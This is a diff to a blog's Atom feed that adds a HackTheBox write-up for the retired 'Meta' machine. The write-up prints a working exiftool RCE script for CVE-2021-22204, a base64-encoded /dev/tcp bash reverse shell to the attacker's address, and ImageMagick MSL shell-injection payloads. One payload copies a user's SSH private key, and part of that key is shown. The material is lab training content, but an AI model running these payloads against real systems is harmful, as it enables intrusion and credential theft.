@@ -1,5 +1,220 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - maggick</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/maggick.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2022-06-11T09:25:00+02:00</updated><entry><title>Forgot username?</title><link href="https://maggick.fr/2022/06/forgot-username.html" rel="alternate"></link><published>2022-06-11T09:25:00+02:00</published><updated>2022-06-11T09:25:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2022-06-11:/2022/06/forgot-username.html</id><summary type="html">&lt;p&gt;&lt;img alt="Forgot username" class="align-left" src="/media/2022.06/forgot.jpg" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - maggick</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/maggick.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2022-06-12T13:50:00+02:00</updated><entry><title>HTB: Meta</title><link href="https://maggick.fr/2022/06/htb-meta.html" rel="alternate"></link><published>2022-06-12T13:50:00+02:00</published><updated>2022-06-12T13:50:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2022-06-12:/2022/06/htb-meta.html</id><summary type="html">&lt;p&gt;&lt;img alt="Meta card" class="align-left" src="/media/2022.06/meta_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.com/home/machines/profile/429"&gt;Meta&lt;/a&gt; publish on
+January 22, 2022 by
+&lt;a href="https://www.hackthebox.com/home/users/profile/27582"&gt;Nauten&lt;/a&gt;.
+This box is rated as a medium machine. It implies subdomain enumeration, a
+vulnerability in &lt;code&gt;exiftool&lt;/code&gt;, another on in &lt;code&gt;ImageMagick&lt;/code&gt; and a too permissive
+&lt;code&gt;sudo&lt;/code&gt; command.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2022.06/meta_card.png" alt="Meta card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.com/home/machines/profile/429"&gt;Meta&lt;/a&gt; publish on
+January 22, 2022 by
+&lt;a href="https://www.hackthebox.com/home/users/profile/27582"&gt;Nauten&lt;/a&gt;.
+This box is rated as a medium machine. It implies subdomain enumeration, a
+vulnerability in &lt;code&gt;exiftool&lt;/code&gt;, another on in &lt;code&gt;ImageMagick&lt;/code&gt; and a too permissive
+&lt;code&gt;sudo&lt;/code&gt; command.&lt;/p&gt;
+
+
+&lt;h1 id="foothold"&gt;Foothold&lt;/h1&gt;
+&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
+&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. Only port 80 (HTTP) and 22 (SSH) are
+open.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.92 scan initiated Thu Jan 27 08:57:07 2022 as: nmap -sSV -p- -oN notes.md 10.129.169.248&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for 10.129.169.248&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.015s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;Not shown: 65533 closed tcp ports (reset)&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT   STATE SERVICE VERSION&lt;/span&gt;
+&lt;span class="code-line"&gt;22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)&lt;/span&gt;
+&lt;span class="code-line"&gt;80/tcp open  http    Apache httpd&lt;/span&gt;
+&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
+&lt;span class="code-line"&gt;# Nmap done at Thu Jan 27 08:57:25 2022 -- 1 IP address (1 host up) scanned in 18.03 seconds&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id="web"&gt;Web&lt;/h2&gt;
+&lt;p&gt;The main website is a project page talking about a in progress development. We
+run a few enumeration tool (&lt;code&gt;nikto&lt;/code&gt; &lt;code&gt;ffuf&lt;/code&gt;) without finding anything interesting.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Meta homepage" src="/media/2022.06/meta_01.png"&gt;&lt;/p&gt;
+&lt;p&gt;We run &lt;code&gt;wfuzz&lt;/code&gt; in order to enumerate subdomain without having to edit
+&lt;code&gt;/etc/hosts/&lt;/code&gt; for each of them and found the &lt;code&gt;dev01&lt;/code&gt; subdomain.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;└─$ wfuzz -c -w subdomains-top1million-5000.txt --sc 200 -H &amp;quot;HOST:FUZZ.artcorp.htb&amp;quot; http://artcorp.htb/&lt;/span&gt;
+&lt;span class="code-line"&gt;********************************************************&lt;/span&gt;
+&lt;span class="code-line"&gt;* Wfuzz 3.1.0 - The Web Fuzzer                         *&lt;/span&gt;
+&lt;span class="code-line"&gt;********************************************************&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Target: http://artcorp.htb/&lt;/span&gt;
+&lt;span class="code-line"&gt;Total requests: 4989&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;=====================================================================&lt;/span&gt;
+&lt;span class="code-line"&gt;ID           Response   Lines    Word       Chars       Payload&lt;/span&gt;
+&lt;span class="code-line"&gt;=====================================================================&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;000001492:   200        9 L      24 W       247 Ch      &amp;quot;dev01 - dev01&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Total time: 8.590615&lt;/span&gt;
+&lt;span class="code-line"&gt;Processed Requests: 4989&lt;/span&gt;
+&lt;span class="code-line"&gt;Filtered Requests: 4988&lt;/span&gt;
+&lt;span class="code-line"&gt;Requests/sec.: 580.7500&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id="dev01"&gt;dev01&lt;/h2&gt;
+&lt;p&gt;The subdomain propose a tool to inspect images metadata.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="dev01 homepage" src="/media/2022.06/meta_01.png"&gt;&lt;/p&gt;
+&lt;p&gt;There is a RCE vulnerability for &lt;code&gt;exiftool&lt;/code&gt;:
+&lt;a href="https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/"&gt;CVE-2021-22204&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;We write a quick script to automate the RCE and get the result:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;usage: python3 l.py cmd&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;(metadata &lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt;\c${system(&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;#39;)};&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt;)&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;payload&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;w&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;cp 0.jpg 1.jpg&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;bzz payload payload.bzz&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;djvumake exploit.djvu INFO=&amp;#39;1,1&amp;#39; BGjp=/dev/null ANTz=payload.bzz&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;exiftool -config configfile &amp;#39;-HasselbladExif&amp;lt;=exploit.djvu&amp;#39; ./1.jpg&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;files&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;imageUpload&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1.jpg&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)}&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;http://dev01.artcorp.htb/metaview/index.php&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;files&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1442&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;896&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;popen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;rm 1.jpg 1.jpg_original payload payload.bzz exploit.djvu&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Using this script and encoding the payload as base64 we can get a reverse
+shell on the box:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;python3 l.py 'echo -n 'YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41NC85MDAxIDA+JjEi' | base64 -d | bash'&lt;/code&gt;&lt;/p&gt;
+&lt;h1 id="user"&gt;User&lt;/h1&gt;
+&lt;p&gt;We are the &lt;code&gt;www-data&lt;/code&gt; user on the box. We run a few enumeration tools
+(&lt;code&gt;linpeas&lt;/code&gt;) but nothing pop out. We run
+&lt;a href="https://github.com/DominicBreuker/pspy"&gt;pspy&lt;/a&gt; to get the running process and
+found that the script &lt;code&gt;/usr/local/bin/convert_images.sh&lt;/code&gt; is running periodically
+by the user with the UID 1000.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;www-data@meta:/tmp$ ./pspy64&lt;/span&gt;
+&lt;span class="code-line"&gt;./pspy64&lt;/span&gt;
+&lt;span class="code-line"&gt;done&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;2022/01/28 08:01:44 CMD: UID=33   PID=5978   | bash&lt;/span&gt;
+&lt;span class="code-line"&gt;2022/01/28 08:01:44 CMD: UID=33   PID=5975   | sh -c echo -n YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41NC85MDAxIDA+JjEi | base64 -d | bash&lt;/span&gt;
+&lt;span class="code-line"&gt;2022/01/28 08:01:44 CMD: UID=33   PID=5974   | /usr/bin/perl -w /usr/local/bin/exiftool /var/www/dev01.artcorp.htb/metaview/uploads/phpnACkFs.jpg --system:all --exiftool:all -e&lt;/span&gt;
+&lt;span class="code-line"&gt;2022/01/28 08:01:44 CMD: UID=33   PID=5973   | sh -c exiftool &amp;#39;/var/www/dev01.artcorp.htb/metaview/uploads/phpnACkFs.jpg&amp;#39; --system:all --exiftool:all -e&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;2022/01/28 08:02:01 CMD: UID=0    PID=18991  | /bin/sh -c cp -rp ~/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf&lt;/span&gt;
+&lt;span class="code-line"&gt;2022/01/28 08:02:01 CMD: UID=0    PID=18993  | /usr/sbin/CRON -f&lt;/span&gt;
+&lt;span class="code-line"&gt;2022/01/28 08:02:01 CMD: UID=0    PID=18994  | /usr/sbin/CRON -f&lt;/span&gt;
+&lt;span class="code-line"&gt;2022/01/28 08:02:01 CMD: UID=0    PID=18995  | /bin/sh -c rm /tmp/*&lt;/span&gt;
+&lt;span class="code-line"&gt;2022/01/28 08:02:01 CMD: UID=1000 PID=18996  | /bin/sh -c /usr/local/bin/convert_images.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;2022/01/28 08:02:01 CMD: UID=1000 PID=18997  | /usr/local/bin/mogrify -format png *.*&lt;/span&gt;
+&lt;span class="code-line"&gt;2022/01/28 08:02:01 CMD: UID=1000 PID=18998  | pkill mogrify&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Looking at the script we see that it convert images using &lt;code&gt;mogrify&lt;/code&gt; which is part
+of &lt;code&gt;ImageMagick&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;www-data@meta:/var/www/dev01.artcorp.htb/metaview$ cat /usr/local/bin/convert_images.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;.htb/metaview$ cat /usr/local/bin/convert_images.sh&lt;/span&gt;
+&lt;span class="code-line"&gt;#!/bin/bash&lt;/span&gt;
+&lt;span class="code-line"&gt;cd /var/www/dev01.artcorp.htb/convert_images/ &amp;amp;&amp;amp; /usr/local/bin/mogrify -format png *.* 2&amp;gt;/dev/null&lt;/span&gt;
+&lt;span class="code-line"&gt;pkill mogrify&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;There is also a vulnerability on &lt;code&gt;ImageMagick&lt;/code&gt; that allow for
+&lt;a href="https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html"&gt;shell injection&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;We write a new &lt;code&gt;svg&lt;/code&gt; image that will echo the result of the &lt;code&gt;id&lt;/code&gt; command in a
+file and wait for the &lt;code&gt;cron&lt;/code&gt; to execute (note that we can also execute the
+command as &lt;code&gt;www-data&lt;/code&gt; to validate the PoC).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;image&lt;/span&gt; &lt;span class="na"&gt;authenticate=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;ff&amp;quot; `echo $(id)&amp;gt; /dev/shm/test`;&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="nt"&gt;&amp;lt;read&lt;/span&gt; &lt;span class="na"&gt;filename=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;pdf:/etc/passwd&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="nt"&gt;&amp;lt;get&lt;/span&gt; &lt;span class="na"&gt;width=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;base-width&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;height=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;base-height&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="nt"&gt;&amp;lt;resize&lt;/span&gt; &lt;span class="na"&gt;geometry=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;400x400&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="nt"&gt;&amp;lt;write&lt;/span&gt; &lt;span class="na"&gt;filename=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;test.png&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="nt"&gt;&amp;lt;svg&lt;/span&gt; &lt;span class="na"&gt;width=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;700&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;height=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;700&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;xmlns=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/2000/svg&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;xmlns:xlink=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/1999/xlink&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="nt"&gt;&amp;lt;image&lt;/span&gt; &lt;span class="na"&gt;xlink:href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;msl:rce.svg&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;height=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;100&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;width=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;100&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="nt"&gt;&amp;lt;/svg&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="nt"&gt;&amp;lt;/image&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;As the file was written we use a payload that will give us access to &lt;code&gt;thomas&lt;/code&gt;'s
+private SSH key.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;image&lt;/span&gt; &lt;span class="na"&gt;authenticate=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;ff&amp;quot; `cp /home/thomas/.ssh/id_rsa /dev/shm/; chmod 777 /dev/shm/id_rsa`;&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="nt"&gt;&amp;lt;read&lt;/span&gt; &lt;span class="na"&gt;filename=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;pdf:/etc/passwd&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="nt"&gt;&amp;lt;get&lt;/span&gt; &lt;span class="na"&gt;width=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;base-width&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;height=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;base-height&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="nt"&gt;&amp;lt;resize&lt;/span&gt; &lt;span class="na"&gt;geometry=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;400x400&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="nt"&gt;&amp;lt;write&lt;/span&gt; &lt;span class="na"&gt;filename=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;test.png&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="nt"&gt;&amp;lt;svg&lt;/span&gt; &lt;span class="na"&gt;width=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;700&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;height=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;700&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;xmlns=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/2000/svg&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;xmlns:xlink=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/1999/xlink&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="nt"&gt;&amp;lt;image&lt;/span&gt; &lt;span class="na"&gt;xlink:href=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;msl:rce2.svg&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;height=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;100&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;width=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;100&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="nt"&gt;&amp;lt;/svg&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="nt"&gt;&amp;lt;/image&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We can then copy the key.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ cat /dev/shm/id_rsa&lt;/span&gt;
+&lt;span class="code-line"&gt;cat /dev/shm/id_rsa&lt;/span&gt;
+&lt;span class="code-line"&gt;-----BEGIN OPENSSH PRIVATE KEY-----&lt;/span&gt;
+&lt;span class="code-line"&gt;b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn&lt;/span&gt;
+&lt;span class="code-line"&gt;NhAAAAAwEAAQAAAYEAt9IoI5gHtz8omhsaZ9Gy+wXyNZPp5jJZvbOJ946OI4g2kRRDHDm5&lt;/span&gt;
+&lt;span class="code-line"&gt;x7up3z5s/H/yujgjgroOOHh9zBBuiZ1Jn1jlveRM7H1VLbtY8k/rN9PFe/MkRsYdH45IvV&lt;/span&gt;
+&lt;span class="code-line"&gt;qMgzqmJPFAdxmkD9WRnVP9OqEF0ZEYwTFuFPUlNq5hSbNRucwXEXbW0Wk7xdXwe3OJk8hu&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;And we connect as &lt;code&gt;thomas&lt;/code&gt; on the box and grab the user flag.&lt;/p&gt;
